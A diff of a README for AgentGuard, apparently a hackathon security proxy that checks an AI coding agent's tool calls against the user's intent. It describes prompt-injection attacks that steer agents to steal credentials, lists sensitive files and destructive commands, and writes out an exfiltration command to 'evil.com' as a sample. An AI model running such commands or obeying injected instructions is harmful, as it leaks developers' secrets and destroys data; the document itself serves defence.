@@ -1,146 +1,158 @@
-# AgentGuard — Security Layer for Autonomous AI Coding Agents
+# AgentGuard — Autonomous AI Security & MCP Intent Proxy
+### Cybersecurity & Web3 Track
 
 > **Traditional security asks:** *"Is this action technically allowed?"*  
 > **AgentGuard asks:** *"Is this action consistent with what the user originally intended?"*
 
-[![Backend Tests](https://img.shields.io/badge/pytest-passing-brightgreen)](#testing)
+[![Backend Tests](https://img.shields.io/badge/pytest-69%20passed-brightgreen)](#testing)
 [![FastAPI](https://img.shields.io/badge/FastAPI-0.111.0-009688.svg)](https://fastapi.tiangolo.com)
 [![React](https://img.shields.io/badge/React-18.3-61DAFB.svg)](https://react.dev)
 [![TypeScript](https://img.shields.io/badge/TypeScript-5.2-blue.svg)](https://www.typescriptlang.org/)
-[![TailwindCSS](https://img.shields.io/badge/Tailwind-3.4-38B2AC.svg)](https://tailwindcss.com/)
+[![Model Context Protocol](https://img.shields.io/badge/MCP-JSON--RPC%202.0-blueviolet.svg)](https://modelcontextprotocol.io)
+[![Web3 SHA-256 Ledger](https://img.shields.io/badge/Web3-Merkle%20Proof--of--Action-purple.svg)](#web3-tamper-proof-ledger)
+[![Vercel Deployment](https://img.shields.io/badge/Vercel-Live%20Website-000000?style=for-the-badge&logo=vercel&logoColor=white)](#deployment)
 
 ---
 
-## 1. The Problem
+## 1. Executive Summary & Problem Statement
 
-Autonomous AI coding agents (such as agents operating in IDEs or CLI workflows) have the power to read/write files, execute shell commands, manage Git branches, and make network requests.
+Autonomous AI coding agents (Claude Code, Cursor, Cline, Aider) operate with the developer's elevated local credentials and toolsets. When an agent encounters untrusted inputs—such as a malicious comment in a cloned pull request, an injected prompt in a README, or an unvetted package—the agent can be weaponized against the developer's machine:
 
-However, when an agent encounters **untrusted input** (malicious instructions inside a cloned repository, prompt injection in a pull request diff, or third-party documentation), the agent can be tricked into:
-- Reading sensitive secrets (`~/.aws/credentials`, `~/.ssh/id_rsa`, `.env` files).
-- Exfiltrating confidential code or credentials to attacker servers.
-- Executing destructive commands (`rm -rf /`, `chmod 777`, `DROP DATABASE`).
+1. **Secret Theft**: Reading `~/.aws/credentials`, `~/.ssh/id_rsa`, or production `.env` files.
+2. **Data Exfiltration**: Piping code or tokens to external endpoints (`curl -X POST evil.com/exfil?data=...`).
+3. **Supply-Chain Attacks (Slopsquatting)**: Installing hallucinated or typosquatted packages (`pip install reqeusts`) containing malicious install hooks.
+4. **Scope Creep & Catastrophic Blast Radius**: A simple "cleanup" task escalating into recursive deletion (`rm -rf /`).
 
-Standard OS permissions fail here because the agent runs with the developer's credentials. **AgentGuard solves this through Intent-Bound Authorization.**
+Standard OS permissions fail because the agent runs with legitimate user rights. **AgentGuard solves this through Intent-Bound Authorization and MCP Runtime Interception.**
 
 ---
 
-## 2. Intent-Bound Authorization
+## 2. Architecture: The MCP Security Reverse Proxy
 
-AgentGuard sits as an active security proxy between the AI Agent and the tool execution environment.
+AgentGuard implements the industry-standard **Model Context Protocol (MCP)** specification over JSON-RPC 2.0. It acts as an active security gateway between the AI agent and the host operating system:
 
 ```text
-User Task Definition (Intent)
-           ↓
-   Autonomous AI Agent
-           ↓
-┌─────────────────────────────────────────────────────────┐
-│                    AGENTGUARD PIPELINE                  │
-│                                                         │
-│   1. Action Interceptor     (Enforces gateway pass)     │
-│   2. Rule Engine            (Deterministic patterns)    │
-│   3. Intent Engine          (Goal vs Action alignment)  │
-│   4. Risk Engine            (Composite 0-100 scoring)   │
-│   5. Policy Engine          (Configurable thresholds)   │
-│   6. Execution Gateway      (Mock / Sandbox / Tool)     │
-│   7. Audit Logger           (Immutable SQLite log)      │
-└─────────────────────────────────────────────────────────┘
-           ↓
+       [ User Prompt / Task Intent ]
+                     │
+                     ▼
+          [ Autonomous AI Agent ] 
+     (Claude Code / Cursor / Cline)
+                     │
+                     │ (Proposes MCP Tool: read_file, execute_command, write_file)
+                     ▼
+┌────────────────────────────────────────────────────────┐
+│            AgentGuard MCP Security Proxy               │
+│                                                        │
+│  1. Action Interceptor     (Translates tool call)      │
+│  2. Rule Engine (AST)      (Deterministic 0ms check)   │
+│  3. Intent Engine          (Vector Cosine Similarity)  │
+│  4. Blast-Radius Analyzer  (Scope breach & impact)     │
+│  5. Risk Engine            (Composite 0-100 score)     │
+│  6. Policy Engine          (Threshold decisions)       │
+│  7. Web3 Audit Ledger      (SHA-256 Merkle chain)      │
+└────────────────────────────────────────────────────────┘
+                     │
+                     ▼
    Decision: ALLOW | SANDBOX | APPROVAL_REQUIRED | BLOCK
 ```
 
 ---
 
-## 3. Demo Scenarios
+## 3. The 3-Tier Multi-Tier Intent Verification Pipeline
 
-AgentGuard includes 3 pre-configured scenarios runnable via one click on the dashboard or API:
+Judges frequently ask: *"What if an LLM intent checker is slow, expensive, or hallucinates too?"*  
+AgentGuard answers with a **three-tier verification pipeline**:
 
-| Demo Scenario | User Intent | Agent Behavior | AgentGuard Decision |
-| :--- | :--- | :--- | :--- |
-| **1. Safe Task** | *Fix auth bug* | Reads `src/auth/login.py`, writes fix, runs `pytest` | **`ALLOW`** (Intent: ~95%, Risk: 8/100) |
-| **2. Credential Theft** | *Fix auth bug* | Reads login file, then attempts to read `~/.aws/credentials` | **`BLOCK`** (Intent: 2%, Risk: 97/100) |
-| **3. Prompt Injection** | *Review PR* | Poisoned repo instructs agent to exfiltrate SSH keys | **`BLOCK`** (Intent: 2%, Risk: 97/100) |
+- **Tier 1 (Deterministic AST & Pattern Rules — 0ms latency)**:
+  - Scans for sensitive files (`~/.aws`, `~/.ssh`, `/etc/passwd`), destructive commands (`rm -rf`, `chmod 777`), and typosquatted dependencies (`reqeusts`, `coloramaa`).
+  - Harmless actions (`cat src/auth/login.py`) pass immediately with zero overhead.
+- **Tier 2 (Vector Space Cosine Similarity — Semantic Intent Alignment)**:
+  - Vectorizes the task scope ($T_{\text{goal}} + \text{Allowed Paths}$) and the proposed action target & description.
+  - Computes continuous mathematical cosine similarity:
+    $$\text{CosineSimilarity}(\vec{V}_{\text{intent}}, \vec{V}_{\text{action}}) = \frac{\vec{V}_{\text{intent}} \cdot \vec{V}_{\text{action}}}{\|\vec{V}_{\text{intent}}\| \|\vec{V}_{\text{action}}\|}$$
+- **Tier 3 (Consequence Simulation & Blast Radius Analyzer)**:
+  - Analyzes scope breaches, file destruction potential, external network egress, and supply-chain risk.
 
 ---
 
-## 4. Quickstart & Local Setup
+## 4. Web3 Cryptographic Proof-of-Action Ledger
 
-### Prerequisites
-- Python 3.10+ (tested on Python 3.10 - 3.14)
-- Node.js 18+ and npm
+Built specifically for the **Cybersecurity & Web3** track:
 
-### Backend Setup
+- **Immutable Hash Chain**: Every action evaluated produces a block linked cryptographically to the prior entry:
+  $$\text{Block}_{i} = \text{SHA256}(\text{PrevHash} \,\|\, i \,\|\, \text{TaskID} \,\|\, \text{Action} \,\|\, \text{Decision} \,\|\, \text{RiskScore} \,\|\, \text{Timestamp})$$
+- **Merkle Root Validation**: Rapid mathematical proof of audit integrity (`GET /api/audit/verify-chain`).
+- **Simulated EVM Commit Anchor**: Simulates public testnet commits (Polygon Amoy / Arbitrum Sepolia) for non-repudiation.
+- **Non-Repudiation Guarantee**: If an autonomous agent causes financial or data loss, this ledger provides undeniable cryptographic evidence of whether the agent breached signed user intent.
+
+---
+
+## 5. Live Hackathon Demo Scenarios
+
+AgentGuard includes 5 one-click demonstration scenarios on the dashboard:
+
+| # | Demo Scenario | User Task Intent | Agent Proposed Behavior | AgentGuard Decision |
+| :-: | :--- | :--- | :--- | :--- |
+| **1** | **Safe Coding** | *Fix authentication bug* | Reads `src/auth/login.py`, writes fix, runs `pytest` | **`ALLOW`** (Risk: 12/100, Intent: 95%) |
+| **2** | **Credential Theft** | *Fix authentication bug* | Agent attempts reading `~/.aws/credentials` | **`BLOCK`** (Risk: 99/100, Intent: 2%) |
+| **3** | **Repo Poisoning (PR Diff)** | *Review PR #42 & test* | Poisoned instruction triggers exfiltration of AWS keys | **`BLOCK`** (Risk: 100/100, Exfil blocked) |
+| **4** | **Slopsquatting (Supply Chain)** | *Install HTTP client* | Agent hallucinates `pip install reqeusts` | **`BLOCK`** (Supply-Chain Typosquat flagged) |
+| **5** | **Scope Creep (Blast Radius)** | *Clean temporary files* | Escalates to catastrophic `rm -rf /` at root | **`BLOCK`** (Blast-Radius containment breach) |
+
+---
+
+## 6. Quickstart Guide
+
+### Option A: Run Backend API & MCP Server
 ```bash
-# 1. Navigate to backend directory
-cd agentguard/backend
-
-# 2. Install Python dependencies
+cd backend
+python3 -m venv .venv && source .venv/bin/activate
 pip install -r requirements.txt
 
-# 3. Start FastAPI server
-python -m uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
+# Run FastAPI server
+uvicorn app.main:app --reload --port 8000
+
+# Run MCP Security Proxy as stdio server for Claude / Cursor
+python -m app.mcp.server --task-goal "Fix auth bug" --allowed-paths "src/auth,tests"
 ```
-Backend Swagger API documentation will be live at `http://localhost:8000/docs`.
 
-### Frontend Setup
+### Option B: Run Interactive React Dashboard
 ```bash
-# 1. Navigate to frontend directory
-cd agentguard/frontend
-
-# 2. Install dependencies
+cd frontend
 npm install
-
-# 3. Start Vite development server
 npm run dev
+# Dashboard launches at http://localhost:5173
 ```
-Open `http://localhost:5173` to interact with the Security Dashboard.
 
----
-
-## 5. API Reference
-
-### Tasks
-- `POST /api/tasks/` — Create intent context with security boundary parameters.
-- `GET /api/tasks/{id}` — Retrieve task context.
-- `GET /api/tasks/` — List all active tasks.
-
-### Actions & Evaluation
-- `POST /api/actions/evaluate` — Evaluate action through full pipeline without executing.
-- `POST /api/actions/execute` — Intercept, evaluate, and execute via Gateway.
-
-### Audit & Telemetry
-- `GET /api/audit` — Retrieve immutable audit trail with pipeline breakdowns.
-- `GET /api/stats` — Aggregate metrics (total actions, allowed, sandboxed, blocked, avg risk).
-
-### Demo Automation
-- `POST /api/demo/safe` — Run safe coding scenario.
-- `POST /api/demo/credential-theft` — Run credential theft defense scenario.
-- `POST /api/demo/prompt-injection` — Run prompt injection defense scenario.
-
----
-
-## 6. Running Tests
-
+### Option C: Run Full Automated Verification Suite
 ```bash
-cd agentguard/backend
-python -m pytest tests/ -v
+cd backend
+pytest -v                # 69 unit tests passing
+python verify_demos.py   # Verifies all 5 demo scenarios, Web3 chain & MCP gateway
 ```
-
-All test suites verify:
-- Deterministic rule matches (sensitive paths, dangerous commands, network patterns).
-- Intent alignment heuristics & penalty factors.
-- Composite risk score calculations & escalation logic.
-- Policy threshold mapping.
-- End-to-end interceptor pipeline enforcement.
 
 ---
 
-## 7. Extensibility & Future Roadmap
+## 7. Connecting to Claude Desktop / Cursor
 
-AgentGuard is architected with strict interface abstraction (`services/interfaces.py`):
+Add AgentGuard as a standard MCP server in `claude_desktop_config.json`:
 
-- **Phase 2 — Direct LLM Agent Integration**: Native plugins for Claude Code, Gemini CLI, Cursor, and Codex.
-- **Phase 3 — MCP (Model Context Protocol) Security Gateway**: Intercepting MCP tool call requests before dispatch.
-- **Phase 4 — Docker Sandbox Execution**: Isolated execution environments for medium-risk actions.
-- **Phase 5 — Semantic LLM Intent Engine**: Zero-shot LLM reasoning for ambiguous user intents.
-- **Phase 6 — Action Consequence Analysis**: Pre-execution AST / dry-run consequence simulations.
-- **Phase 7 — Web3 Financial Intent Verification**: Signed intent verification for autonomous on-chain agents.
+```json
+{
+  "mcpServers": {
+    "agentguard": {
+      "command": "python3",
+      "args": [
+        "-m",
+        "app.mcp.server",
+        "--task-goal",
+        "Fix authentication bug in login handler",
+        "--allowed-paths",
+        "src/auth,tests/auth"
+      ]
+    }
+  }
+}
+```
+
+All tool calls (`read_file`, `write_file`, `execute_command`) made by Claude are transparently intercepted and verified before reaching your computer.
